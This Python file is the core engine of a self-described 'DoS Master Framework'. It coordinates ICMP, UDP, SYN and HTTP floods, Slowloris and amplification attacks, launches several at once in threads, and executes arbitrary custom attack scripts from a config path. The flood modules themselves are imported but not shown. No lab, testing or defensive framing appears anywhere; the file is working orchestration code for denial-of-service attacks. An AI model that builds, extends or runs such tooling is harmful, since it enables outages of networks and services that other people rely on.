#!/usr/bin/env python3
"""
DoS Master Framework - Core Attack Engine
Handles attack execution and coordination
"""

import threading
import time
import importlib
from typing import Dict, Any, Optional
from datetime import datetime

from attacks.icmp_flood import ICMPFlood
from attacks.udp_flood import UDPFlood
from attacks.syn_flood import SYNFlood
from attacks.http_flood import HTTPFlood
from attacks.slowloris import Slowloris
from attacks.amplification import AmplificationAttack

class DoSEngine:
    """Core attack execution engine"""
    
    def __init__(self, config: Dict, logger):
        self.config = config
        self.logger = logger
        self.active_attacks = {}
        self.attack_results = {}
        self.attack_classes = {
            'icmp_flood': ICMPFlood,
            'udp_flood': UDPFlood,
            'syn_flood': SYNFlood,
            'http_flood': HTTPFlood,
            'slowloris': Slowloris,
            'amplification': AmplificationAttack
        }
        
    def execute_attack(self, attack_type: str, attack_config: Dict) -> Dict[str, Any]:
        """Execute a specific attack type"""
        self.logger.info(f"Executing {attack_type} attack")
        
        try:
            if attack_type == 'multi_vector':
                return self._execute_multi_vector_attack(attack_config)
            elif attack_type == 'custom':
                return self._execute_custom_attack(attack_config)
            else:
                return self._execute_single_attack(attack_type, attack_config)
                
        except Exception as e:
            self.logger.error(f"Attack execution failed: {e}")
            raise
    
    def _execute_single_attack(self, attack_type: str, config: Dict) -> Dict[str, Any]:
        """Execute a single attack type"""
        if attack_type not in self.attack_classes:
            raise ValueError(f"Unknown attack type: {attack_type}")
        
        # Create attack instance
        attack_class = self.attack_classes[attack_type]
        attack_instance = attack_class(config, self.logger)
        
        # Validate attack configuration
        if not attack_instance.validate_config():
            raise ValueError("Invalid attack configuration")
        
        # Store active attack
        attack_id = f"{attack_type}_{int(time.time())}"
        self.active_attacks[attack_id] = attack_instance
        
        try:
            # Execute attack
            result = attack_instance.execute()
            self.attack_results[attack_id] = result
            
            return result
            
        finally:
            # Cleanup
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
    
    def _execute_multi_vector_attack(self, config: Dict) -> Dict[str, Any]:
        """Execute coordinated multi-vector attack"""
        self.logger.info("Starting multi-vector attack")
        
        # Define attack vectors
        attack_vectors = config.get('vectors', ['icmp_flood', 'udp_flood', 'syn_flood'])
        duration = config.get('duration', 60)
        
        results = {}
        threads = []
        
        try:
            # Start each attack vector
            for vector in attack_vectors:
                if vector in self.attack_classes:
                    vector_config = config.copy()
                    vector_config['duration'] = duration
                    
                    thread = threading.Thread(
                        target=self._execute_vector_thread,
                        args=(vector, vector_config, results)
                    )
                    thread.start()
                    threads.append(thread)
                    
                    # Stagger attack starts
                    time.sleep(2)
            
            # Wait for all attacks to complete
            for thread in threads:
                thread.join()
            
            # Aggregate results
            aggregated_result = self._aggregate_results(results)
            return aggregated_result
            
        except Exception as e:
            self.logger.error(f"Multi-vector attack failed: {e}")
            raise
    
    def _execute_vector_thread(self, attack_type: str, config: Dict, results: Dict):
        """Execute attack vector in separate thread"""
        try:
            result = self._execute_single_attack(attack_type, config)
            results[attack_type] = result
        except Exception as e:
            self.logger.error(f"Vector {attack_type} failed: {e}")
            results[attack_type] = {'error': str(e)}
    
    def _execute_custom_attack(self, config: Dict) -> Dict[str, Any]:
        """Execute custom attack from configuration"""
        custom_script = config.get('script')
        if not custom_script:
            raise ValueError("Custom attack requires script path")
        
        # Load and execute custom attack module
        spec = importlib.util.spec_from_file_location("custom_attack", custom_script)
        custom_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(custom_module)
        
        # Execute custom attack
        if hasattr(custom_module, 'execute_attack'):
            return custom_module.execute_attack(config, self.logger)
        else:
            raise ValueError("Custom script must implement execute_attack function")
    
    def _aggregate_results(self, results: Dict) -> Dict[str, Any]:
        """Aggregate results from multiple attack vectors"""
        total_packets = sum(r.get('packets_sent', 0) for r in results.values() if 'error' not in r)
        total_duration = max(r.get('duration', 0) for r in results.values() if 'error' not in r)
        
        return {
            'attack_type': 'multi_vector',
            'vectors': list(results.keys()),
            'total_packets_sent': total_packets,
            'total_duration': total_duration,
            'avg_rate': total_packets / total_duration if total_duration > 0 else 0,
            'vector_results': results,
            'timestamp': datetime.now().isoformat()
        }
    
    def stop_all_attacks(self):
        """Stop all active attacks"""
        self.logger.info("Stopping all active attacks")
        
        for attack_id, attack_instance in self.active_attacks.items():
            try:
                attack_instance.stop()
                self.logger.info(f"Stopped attack: {attack_id}")
            except Exception as e:
                self.logger.error(f"Failed to stop attack {attack_id}: {e}")
        
        self.active_attacks.clear()
    
    def get_attack_status(self, attack_id: str) -> Optional[Dict]:
        """Get status of specific attack"""
        if attack_id in self.active_attacks:
            return self.active_attacks[attack_id].get_status()
        return None
    
    def cleanup(self):
        """Cleanup resources"""
        self.stop_all_attacks()
        self.logger.info("Attack engine cleanup completed")